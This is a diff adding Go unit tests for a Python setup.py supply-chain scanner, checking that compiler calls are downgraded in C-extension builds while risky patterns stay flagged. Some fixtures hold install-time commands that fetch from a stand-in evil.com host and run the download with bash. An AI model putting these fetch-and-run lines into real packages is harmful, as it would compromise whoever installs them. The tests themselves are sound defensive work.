@@ -1274,6 +1274,288 @@ setup(
 }
 
 // ============================================================
+// C Extension Build Allowlist Tests
+// ============================================================
+
+// Test: psycopg2-style setup.py with subprocess calls for C extension compilation
+// Justification: Packages with C extensions (psycopg2, numpy, etc.) legitimately
+//                use subprocess to invoke compilers (gcc, g++, clang). These are
+//                standard build patterns, not supply chain attack vectors.
+// Source: PyPA documentation on building C extensions with setuptools/distutils;
+//         "Backstabber's Knife Collection" (Ohm et al., 2020) — distinguishes
+//         build-time compilation from malicious subprocess use.
+// Methodology: Pass a setup.py with C extension build patterns to AnalyzePythonSetup
+// Result: subprocess/exec patterns are downgraded to LOW severity
+func TestAnalyzePythonSetup_CExtensionBuildSubprocess(t *testing.T) {
+	setupContent := `
+from setuptools import setup, Extension
+import subprocess
+
+# Check for pg_config
+result = subprocess.check_output(['pg_config', '--includedir'])
+
+ext_modules = [
+    Extension('psycopg2._psycopg',
+              sources=['psycopg/psycopg.c'],
+              include_dirs=[result.strip()])
+]
+
+setup(
+    name='psycopg2',
+    version='2.9.9',
+    ext_modules=ext_modules,
+)
+`
+	analysis := AnalyzePythonSetup(setupContent)
+
+	// Should still detect patterns but downgraded
+	for _, p := range analysis.DangerousPatterns {
+		if p.Pattern == "subprocess call" && p.Severity == "HIGH" {
+			t.Errorf("subprocess call in C extension build context should be downgraded from HIGH, got: %s", p.Severity)
+		}
+	}
+	if analysis.RiskLevel == "HIGH" {
+		t.Errorf("Expected non-HIGH risk level for C extension build, got HIGH")
+	}
+}
+
+// Test: numpy-style setup.py with subprocess calls to gcc/make
+// Justification: numpy uses subprocess to invoke gcc and make for compiling
+//                C/Fortran extensions. These are standard build operations.
+// Source: numpy build documentation; PyPA C extension build guide
+// Methodology: Pass numpy-like setup.py with compiler subprocess calls
+// Result: All build-related patterns downgraded to LOW
+func TestAnalyzePythonSetup_NumpyStyleBuild(t *testing.T) {
+	setupContent := `
+from numpy.distutils.core import setup, Extension
+import subprocess
+import os
+
+# Detect compiler
+subprocess.call(['gcc', '-v'])
+subprocess.check_call(['make', '-C', 'src'])
+
+ext_modules = [
+    Extension('numpy.core._multiarray_umath',
+              sources=['numpy/core/src/multiarray/array_assign.c'])
+]
+
+setup(
+    name='numpy',
+    version='1.26.0',
+    ext_modules=ext_modules,
+)
+`
+	analysis := AnalyzePythonSetup(setupContent)
+
+	for _, p := range analysis.DangerousPatterns {
+		if p.Pattern == "subprocess call" && p.Severity == "HIGH" {
+			t.Errorf("subprocess call to gcc/make in numpy build should be LOW, got HIGH. Match: %s", p.Match)
+		}
+	}
+	if analysis.RiskLevel == "HIGH" {
+		t.Errorf("Expected non-HIGH risk for numpy-style build, got HIGH")
+	}
+}
+
+// Test: Cython setup.py with exec() for build configuration
+// Justification: Cython packages use exec() to evaluate build configuration
+//                and cythonize() for compilation. This is standard practice.
+// Source: Cython documentation on building extensions
+// Methodology: Pass Cython-style setup.py with exec() call
+// Result: exec() in Cython build context is downgraded to LOW
+func TestAnalyzePythonSetup_CythonBuild(t *testing.T) {
+	setupContent := `
+from setuptools import setup, Extension
+from Cython.Build import cythonize
+
+extensions = cythonize([
+    Extension("mymodule", sources=["mymodule.pyx"])
+])
+
+setup(
+    name='mymodule',
+    ext_modules=extensions,
+)
+`
+	analysis := AnalyzePythonSetup(setupContent)
+
+	if analysis.RiskLevel == "HIGH" {
+		t.Errorf("Expected non-HIGH risk for Cython build, got HIGH")
+	}
+}
+
+// Test: C extension build with cmake subprocess calls
+// Justification: cmake is a standard build tool for C/C++ extensions.
+//                subprocess.call(['cmake', ...]) is a benign build operation.
+// Source: CMake documentation; PyPA guide on building C extensions
+// Methodology: Pass setup.py using cmake via subprocess
+// Result: cmake subprocess calls are downgraded to LOW
+func TestAnalyzePythonSetup_CmakeBuild(t *testing.T) {
+	setupContent := `
+from setuptools import setup, Extension
+import subprocess
+
+subprocess.check_call(['cmake', '.', '-DCMAKE_BUILD_TYPE=Release'])
+subprocess.check_call(['cmake', '--build', '.'])
+
+setup(
+    name='native-lib',
+    version='1.0.0',
+    ext_modules=[Extension('native', sources=['native.c'])],
+)
+`
+	analysis := AnalyzePythonSetup(setupContent)
+
+	for _, p := range analysis.DangerousPatterns {
+		if p.Pattern == "subprocess call" && p.Severity == "HIGH" {
+			t.Errorf("cmake subprocess call should be LOW, got HIGH. Match: %s", p.Match)
+		}
+	}
+	if analysis.RiskLevel == "HIGH" {
+		t.Errorf("Expected non-HIGH risk for cmake build, got HIGH")
+	}
+}
+
+// Test: C extension build context but with dangerous network subprocess call
+// Justification: Even in C extension build context, subprocess calls that
+//                download from the network (curl, wget, pip install) are
+//                suspicious and should NOT be downgraded.
+// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — network
+//         operations during install are a primary supply chain attack vector
+// Methodology: Pass setup.py with both C extension context AND network downloads
+// Result: Network-related subprocess calls remain HIGH severity
+func TestAnalyzePythonSetup_CExtWithDangerousNetwork(t *testing.T) {
+	setupContent := `
+from setuptools import setup, Extension
+import subprocess
+
+subprocess.call(['curl', 'https://evil.com/payload.sh'])
+subprocess.call(['wget', 'https://evil.com/malware'])
+
+ext_modules = [Extension('myext', sources=['myext.c'])]
+setup(name='suspicious', ext_modules=ext_modules)
+`
+	analysis := AnalyzePythonSetup(setupContent)
+
+	foundHighSubprocess := false
+	for _, p := range analysis.DangerousPatterns {
+		if p.Pattern == "subprocess call" && p.Severity == "HIGH" {
+			foundHighSubprocess = true
+		}
+	}
+	if !foundHighSubprocess {
+		t.Error("Expected subprocess calls with curl/wget to remain HIGH even in C extension context")
+	}
+	if analysis.RiskLevel != "HIGH" {
+		t.Errorf("Expected HIGH risk level for network downloads, got %s", analysis.RiskLevel)
+	}
+}
+
+// Test: Malicious setup.py without C extension context is unaffected
+// Justification: The build allowlist should ONLY apply when C extension
+//                build indicators are present. A setup.py without Extension()
+//                or distutils imports that uses subprocess should still be HIGH.
+// Source: "Towards Measuring Supply Chain Attacks" (NDSS 2020)
+// Methodology: Pass malicious setup.py without C extension indicators
+// Result: Patterns remain HIGH — no downgrading without build context
+func TestAnalyzePythonSetup_MaliciousWithoutBuildContext(t *testing.T) {
+	setupContent := `
+from setuptools import setup
+import subprocess
+
+subprocess.call(['curl', 'https://evil.com/payload', '-o', '/tmp/payload'])
+subprocess.call(['bash', '/tmp/payload'])
+
+setup(name='malicious-pkg', version='1.0.0')
+`
+	analysis := AnalyzePythonSetup(setupContent)
+
+	if analysis.RiskLevel != "HIGH" {
+		t.Errorf("Expected HIGH risk for malicious setup.py without build context, got %s", analysis.RiskLevel)
+	}
+
+	foundHighSubprocess := false
+	for _, p := range analysis.DangerousPatterns {
+		if p.Pattern == "subprocess call" && p.Severity == "HIGH" {
+			foundHighSubprocess = true
+		}
+	}
+	if !foundHighSubprocess {
+		t.Error("Expected subprocess patterns to remain HIGH without C extension context")
+	}
+}
+
+// Test: Build context with cmdclass override for build_ext
+// Justification: cmdclass = {'build_ext': CustomBuildExt} is the standard
+//                pattern for customizing C extension builds. Should be LOW.
+// Source: setuptools documentation on customizing build_ext
+// Methodology: Pass setup.py with build_ext cmdclass override
+// Result: cmdclass override in build context is downgraded to LOW
+func TestAnalyzePythonSetup_CmdclassBuildExt(t *testing.T) {
+	setupContent := `
+from setuptools import setup, Extension
+from setuptools.command.build_ext import build_ext
+
+class CustomBuildExt(build_ext):
+    def build_extensions(self):
+        build_ext.build_extensions(self)
+
+setup(
+    name='myext',
+    ext_modules=[Extension('myext', sources=['myext.c'])],
+    cmdclass={'build_ext': CustomBuildExt},
+)
+`
+	analysis := AnalyzePythonSetup(setupContent)
+
+	for _, p := range analysis.DangerousPatterns {
+		if p.Pattern == "cmdclass override" && p.Severity != "LOW" {
+			t.Errorf("cmdclass override in build_ext context should be LOW, got %s", p.Severity)
+		}
+	}
+}
+
+// Test: C extension build with mixed benign and dangerous patterns
+// Justification: A setup.py can have both benign build subprocess calls AND
+//                genuinely dangerous patterns (base64 decode, socket). Only
+//                build-explainable patterns should be downgraded.
+// Source: "Backstabber's Knife Collection" (Ohm et al., 2020)
+// Methodology: Pass setup.py with C extension context, build subprocess, and base64
+// Result: subprocess downgraded, base64/socket remain at original severity
+func TestAnalyzePythonSetup_MixedBuildAndDangerous(t *testing.T) {
+	setupContent := `
+from setuptools import setup, Extension
+import subprocess
+import base64
+import socket
+
+subprocess.check_call(['gcc', '-shared', '-o', 'myext.so', 'myext.c'])
+payload = base64.b64decode('aW1wb3J0IG9z')
+socket.socket()
+
+setup(name='mixed', ext_modules=[Extension('myext', sources=['myext.c'])])
+`
+	analysis := AnalyzePythonSetup(setupContent)
+
+	if analysis.RiskLevel != "HIGH" {
+		t.Errorf("Expected HIGH risk due to base64+socket despite build context, got %s", analysis.RiskLevel)
+	}
+
+	for _, p := range analysis.DangerousPatterns {
+		if p.Pattern == "subprocess call" && p.Severity == "HIGH" {
+			t.Errorf("subprocess call to gcc should be downgraded in build context, got HIGH")
+		}
+		if p.Pattern == "base64 decode" && p.Severity != "HIGH" {
+			t.Errorf("base64 decode should remain HIGH even in build context, got %s", p.Severity)
+		}
+		if p.Pattern == "socket connection" && p.Severity != "HIGH" {
+			t.Errorf("socket connection should remain HIGH even in build context, got %s", p.Severity)
+		}
+	}
+}
+
+// ============================================================
 // resolveScriptFilePaths Tests
 // ============================================================
 
